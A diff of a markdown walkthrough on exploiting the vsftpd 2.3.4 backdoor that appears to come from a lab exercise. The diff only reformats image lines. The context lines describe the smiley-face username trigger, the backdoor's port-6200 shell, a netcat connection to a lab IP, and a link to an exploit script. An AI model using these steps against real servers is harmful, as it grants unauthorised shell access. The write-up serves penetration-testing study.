@@ -22,7 +22,7 @@
 - SearchSploit is a command-line search tool for Exploit-DB that allows you to take a copy of the Exploit Database with you.
 - `searchsploit vsftpd 2.3.4`
 	
-	![searchsploit results](../images/vsftpd_2.3.4.jpeg)
+	- ![searchsploit results](../images/vsftpd_2.3.4.jpeg)
 
 - SearchSploit reveals that there is `Backdoor Command Execution` vulnerability present in vsftpd 2.3.4 version of FTP.
 
@@ -33,7 +33,7 @@
 
 - We can see in the if the bytes of the input match `0x3a` [":" from HEX] and `0x29` [")" from HEX], the `vsf_sysutil_extra()` function will get executed.
 
-![backdoor code](https://static.packt-cdn.com/products/9781786463166/graphics/image_01_017.jpg)
+- ![backdoor code](https://static.packt-cdn.com/products/9781786463166/graphics/image_01_017.jpg)
 
 - The `vsf_sysutil_extra()` function contains the following code. We can clearly see that it attempts to open port 6200 through `htons(6200)` and provides a shell with `execl("/bin/sh")` so that attacker can interact with the system.
 
@@ -56,13 +56,13 @@
 		- `PASS any_password` # password doesn't matter
 		- This should've opened port `6200` on the host machine that runs the backdoor.
 
-		![backdoor command injection](../images/backdoor_command_inject_vsftpd_1.jpeg)
+		- ![backdoor command injection](../images/backdoor_command_inject_vsftpd_1.jpeg)
 
 	- Use telent or netcat to connect on `6200` port backdoor:
 		- `nc 172.16.242.129 6200`
 		- `id` # verify Connection
 
-		![backdoor command injection](../images/backdoor_command_inject_vsftpd_2.jpeg)
+		- ![backdoor command injection](../images/backdoor_command_inject_vsftpd_2.jpeg)
 
 - Automated Script Exploitation:
 	- Script can be downloaded from exploit-db [https://www.exploit-db.com/exploits/49757] or copied from searchsploit tool.
